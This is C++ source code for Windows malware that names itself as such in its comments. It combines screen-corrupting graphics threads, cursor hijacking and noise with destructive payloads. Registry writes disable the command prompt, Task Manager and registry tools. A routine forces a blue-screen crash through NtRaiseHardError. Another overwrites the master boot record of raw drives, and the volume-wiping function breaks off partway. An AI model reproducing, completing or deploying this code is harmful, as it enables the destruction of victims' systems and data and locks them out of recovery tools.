#include <windows.h>
#include <winreg.h>
#include <wingdi.h>
#include <windowsx.h>
#include <winuser.h>
#include <ctime>
#include <math.h>
#include <iostream>
#include <vector>
#include <mmsystem.h>
#include <cstring>
using namespace std;
#pragma comment(lib, "Winmm.lib") //connect an winmm
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 6 | t >> 12) & 15 & t >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 5 | t));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound11(){
	
	HWAVEOUT hwo;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 }; //we will do an PCM sound, 8KHZ
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //for example i will do an 8 seconds
	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>(t*(42&t>>10));

	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
}
#define M_PI   3.14159265358979323846264338327950288
#pragma comment(lib,"Msimg32.lib")
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
DWORD WINAPI cur(LPVOID lpParam) {
	POINT cursor;
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON);
		GetCursorPos(&cursor);
		//int X = cursor.x + rand() % 3 - 1;
		//int Y = cursor.y + rand() % 3 - 1;
		//int top_x = 0 + cursor.x;
		//int top_y = 0 + cursor.y;
		//int size = rand() % 900 +100;
		//int bottom_x = 300 + cursor.x;
		//int bottom_y = 300 + cursor.y;
		x += incrementor * signX;
		y += incrementor * signY;
		SetCursorPos(x, y);
		DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadCursor(0, IDC_ARROW));
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return(1);
}
DWORD WINAPI shader1(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	//HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		//RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)((8 * i) + ((8 * i) * sin(x / 32.0)) + (4 * i) + ((4 * i) * sin(y / 24.0)));

				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader2(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	//HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		//RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)(x^y);

				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader3(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)(x ^ y);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader4(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				double fractalX = (2.5f / w);
				double fractalY = (1.90f / h);

				double cx = x * fractalX - 2.f;
				double cy = y * fractalY - 0.95f;

				double zx = 0;
				double zy = 0;

				int fx = 0;

				while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
				{
					double fczx = zx * zx - zy * zy + cx;
					double fczy = 2 * zx * zy + cy;

					zx = fczx;
					zy = fczy;
					fx++;

					rgbquadCopy = rgbquad[index];

					hslcolor = Colors::rgb2hsl(rgbquadCopy);
					hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

					rgbquad[index] = Colors::hsl2rgb(hslcolor);
				}
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCERASE);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI sines1(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
			angle += M_PI / 40;
			DeleteObject(&a); DeleteObject(&i);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}
DWORD WINAPI sines2(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(hdc, i, 0, 1, sh, hdc, i, a, SRCCOPY);
			angle += M_PI / 40;
			DeleteObject(&a); DeleteObject(&i);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}
DWORD WINAPI blur(LPVOID lpvd)
{
	//Credits to ArTicZera and Rekto
	HDC hdc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(dcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		BitBlt(dcCopy, rand() % 10, rand() % 12, w, h, hdc, rand() % -10, rand() % -12, SRCCOPY);
		AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
		//Sleep(rand() % 25);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}
VOID WINAPI ci2(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
	SelectObject(hdc, brush);
	BitBlt(hdc, x, y, w, h, hdc, x, y, 0x2837E28);
	DeleteObject(hrgn);
	DeleteObject(brush);
	ReleaseDC(NULL, hdc);
}
DWORD WINAPI wef2(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

	for (int t = 0;; t++)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 100)
		{
			ci2(x - i / 2, y - i / 2, i, i);
		}
	}
}
DWORD WINAPI shader5(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)(x * y);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		int rx = rand() % w;
		int ry = rand() % h;
		BitBlt(hdc, 10, ry, w, 96, hdcCopy, 0, ry, SRCCOPY);
		BitBlt(hdc, -10, ry, w, -96, hdcCopy, 0, ry, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader6(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	//HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		//RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)5 * i;

				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}

		i++;
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 10, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, -h + 10, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader7(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 110)
				v = rand() % 25;
			((BYTE*)(data + i))[v * v] = ((BYTE*)(data + i + v))[v];
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI triangles(LPVOID lpParam) {
	while (1) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HPEN hPen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, 0, 0));
		HPEN hOldPen = SelectPen(hdc, hPen);

		HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, 0, 0));
		HBRUSH hOldBrush = SelectBrush(hdc, hBrush);

		POINT vertices[] = { {rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h} };
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));

		SelectBrush(hdc, hOldBrush);
		DeleteObject(hBrush);

		SelectPen(hdc, hOldPen);
		DeleteObject(hPen);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI shader8(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			if (i % h && rand() % 110)
				v = rand() % 2;
			*((BYTE*)data + 4 * i + v) = i;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCERASE);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader9(LPVOID){
	while(true){
		srand((unsigned int)GetTickCount());
		HDC hDC = GetDC(NULL);
		int x = GetSystemMetrics(SM_CYSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);

		int x1 = rand() % x;
		int y1 = rand() % y;
		int x2 = rand() % x;
		int y2 = rand() % y;
		for (int z = 1; z <= 1000; z++)
		{
			BitBlt(hDC, rand() % x, rand() % y, rand() % x * 2, rand() % y * 2, hDC, rand() % x1, rand() % y1, DSTINVERT);
		}
		ReleaseDC (NULL, hDC);
	}
}
DWORD WINAPI textout1(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "just a simple thing";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}
DWORD WINAPI darkness(LPVOID lpvd) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, BLACKNESS);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI GDI(LPVOID)
{
	HANDLE cursor = CreateThread(0, 0, cur, 0, 0, 0);
	//CreateThread(0, 0, msg, 0, 0, 0);
	//HANDLE thread0 = CreateThread(0, 0, textz, 0, 0, 0);
	HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
	HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
	HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
	HANDLE thread3dot1 = CreateThread(0, 0, sines1, 0, 0, 0);
	HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
	HANDLE thread4dot1 = CreateThread(0, 0, sines2, 0, 0, 0);
	HANDLE thread5 = CreateThread(0, 0, blur, 0, 0, 0);
	HANDLE thread5dot1 = CreateThread(0, 0, wef2, 0, 0, 0);
	HANDLE thread6 = CreateThread(0, 0, shader5, 0, 0, 0);
	HANDLE thread7 = CreateThread(0, 0, shader6, 0, 0, 0);
	HANDLE thread8 = CreateThread(0, 0, shader7, 0, 0, 0);
	HANDLE thread8dot1 = CreateThread(0, 0, triangles, 0, 0, 0);
	HANDLE thread9 = CreateThread(0, 0, shader8, 0, 0, 0);
	HANDLE thread9dot1 = CreateThread(0, 0, textout1, 0, 0, 0);
	HANDLE thread10 = CreateThread(0, 0, shader9, 0, 0, 0);
	HANDLE thread11 = CreateThread(0, 0, darkness, 0, 0, 0);
	Sleep(1 << 30);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread8, 0);
	CloseHandle(thread8);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread8dot1, 0);
	CloseHandle(thread8dot1);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread7, 0);
	CloseHandle(thread7);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread6, 0);
	CloseHandle(thread6);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread5, 0);
	CloseHandle(thread5);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread5dot1, 0);
	CloseHandle(thread5dot1);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread4dot1, 0);
	CloseHandle(thread4dot1);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread4, 0);
	CloseHandle(thread4);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread3, 0);
	CloseHandle(thread3);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread3dot1, 0);
	CloseHandle(thread3dot1);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread2, 0);
	CloseHandle(thread2);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread1, 0);
	CloseHandle(thread1);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread9, 0);
	CloseHandle(thread9);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread10, 0);
	CloseHandle(thread10);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread9dot1, 0);
	CloseHandle(thread9dot1);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread11, 0);
	CloseHandle(thread11);
	InvalidateRect(0, 0, 0);
	return 0;
}
void DisableFunctional()
{
	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Policies\\Microsoft\\Windows\\System", 0, KEY_WRITE, &hKey);
	DWORD data = 1; // Your desired value
	RegSetValueEx(hKey, L"DisableCMD", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&data), sizeof(DWORD));
	RegSetValueEx(hKey, L"DisableTaskMgr", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&data), sizeof(DWORD));
	RegSetValueEx(hKey, L"DisableRegistryTools", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&data), sizeof(DWORD));
	RegCloseKey(hKey);
}
void BSOD(){
	typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
	typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
	BOOLEAN bl;
	DWORD response;
	NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
	RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
	RtlAdjustPrivilege(19, 1, 0, &bl);
	NtRaiseHardError(0x4000007EL, 0, 0, 0, 6, &response);
	Sleep(-1);
}
DWORD WINAPI MBRWiper(const char* drivename,unsigned char* MasterBootRecord) {
	/* MBR.bin (6/24/2024 5:17:54 PM)
   StartOffset(h): 00000000, EndOffset(h): 000001FF, Length(h): 00000200 */


	DWORD dwBytesWritten;

    const char* prefix = "\\\\.\\";
    
    // Calculate the total length needed for the concatenated string
    size_t totalLength = std::strlen(prefix) + std::strlen(drivename);
    
    // Allocate memory for the concatenated string
    char* a = new char[totalLength + 1]; // +1 for the null terminator
    
    // Copy the prefix
    strcpy_s(a, totalLength + 1,prefix);
    
    // Concatenate the drive name
    strcat_s(a, totalLength + 1,drivename);
	HANDLE hDevice = CreateFileA(
		a, GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);
	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 0;
}
void WipeMBRs(){
    char *str = new char[MAX_PATH];
    HANDLE hVol = FindFirstVolumeA(str, MAX_PATH);
    char *str2 = new char[4];
    DWORD a = 0;
